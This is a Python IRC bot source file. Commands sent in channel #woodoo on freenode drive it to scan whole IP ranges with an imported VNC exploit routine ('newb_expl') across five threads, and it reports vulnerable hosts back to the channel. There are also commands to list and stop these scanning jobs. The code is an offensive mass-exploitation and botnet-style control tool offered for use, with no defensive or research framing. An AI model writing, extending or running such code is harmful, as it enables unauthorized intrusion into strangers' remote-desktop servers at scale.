from connection import Connection
from vnc_expl import newb_expl
from threading import Thread

class Bot:
	END_OF_MOTD = '376'
	PREFIX = 'v'
	TAG = '(vayne)'

	def __init__(self, nick):
		self.__connections = []
		self.__buffers = []
		self.__channels = []
		self.__threads = {}
		self.__key = 0
		self.__nick = nick

	def add_connection(self, sv, port):
		con = Connection(sv, port)
		self.__connections.append(con)
		self.__buffers.append('')

	def set_channels(self, channels):
		self.__channels = channels

	def connect(self):
		for con in self.__connections:
			if con.active:
				continue
			con.connect(self.__nick)
		self.work()
	
	@property
	def currcon(self):
		return self.__connections[self.__key]

	def printayne(self, msg, targets=None):
		self.currcon.msg('{0} ~ {1}'.format(self.TAG, msg), targets)

	def parse(self, data):
		print(data)
		source = ''
		line = ''
		if data.startswith(':'):
			source, line = data[1:].split(' ', 1)
		else:
			source = None
			p = data.split(' ')
			if p[0] == 'PING':
				self.currcon.write(('PONG', p[1]))
				print("PONG")
				return

		if ' :' in line:
			argstr, text = line.split(' :', 1)
		else:
			argstr, text = line, ''
		args = argstr.split(' ')
		print(args)

		if args[0] == self.END_OF_MOTD:
			for channel in self.__channels:
				self.currcon.write(('JOIN', channel))
			return	

		if text:
			if text[0] == self.PREFIX and len(text.split(' ')) >= 2:
				print('CMD!')
				self.parse_cmd(text)

	def check_args(self, args, req):
		if len(args) < req:
			return False
		return True

	def parse_cmd(self, cmd):
		args = cmd[2:].split(' ')
		if len(args) > 1:
			cmd, args = cmd[2:].split(' ', 1)
		else:
			cmd = args[0]
			args = ''
		args = args.split(' ')

		if (cmd == 'join'):
			if not self.check_args(args, 1):
				return
			self.currcon.write(('JOIN', args[0]))
		if (cmd == 'vnc_newb'):
			threads = []
			for i in range(5):
				b = i * 51
				e = b + 51
				threads.append(Thread(target=self.vnc_newb_expl, args=(args[0], b, e)))
			
			if 'vnc' not in self.__threads:
				self.__threads['vnc'] = []

			for t in threads:
				self.__threads['vnc'].append(t)
				t.start()

			self.printayne('5 jobs now exploiting the mask {0}'.format(args[0]), self.__channels)
		if (cmd == 'jobs'):
			ct = 0
			jobs = ''
			for k, v in self.__threads.iteritems():
				l = len(v)
				ct += l
				jobs += '{0}[{1}] '.format(k, l)
			self.printayne('currently running {0} jobs => {1}'.format(ct, jobs), self.__channels)
		if (cmd == 'stop'):
			if not self.check_args(args, 1):
				return
			if args[0] == 'all':
				self.__threads.clear()
				return
			if args[0] in self.__threads:
				del self.__threads[args[0]][:]

	def vnc_newb_expl(self, mask, b, e):
		for i in xrange(b, e):
			for j in range(256):
				if 'vnc' in self.__threads and not self.__threads['vnc']:
					return
				host = '{0}.{1}.{2}'.format(mask, i, j)
				if newb_expl(host):
					self.printayne('vnc vulnerable => {0}'.format(host), self.__channels)
			
	def work(self):
		while True:
			for key, con in enumerate(self.__connections):
				self.__buffers[self.__key] += con.socket.recv(1024)
				temp = self.__buffers[self.__key].split('\n')
				self.__buffers[self.__key] = temp.pop()
				
				for line in temp:
					clean = line.rstrip()
					self.__key = key
					self.parse(clean)

if __name__ == '__main__':
	bot = Bot('woodoozera')
	bot.add_connection('irc.freenode.org', 6667)
	bot.set_channels(['#woodoo'])
	bot.connect()

	"""testing parse
	bot = Bot('aasdjqrr')
	bot.parse('PING HRuiashdiuah jaoisuhras', 1)
	"""
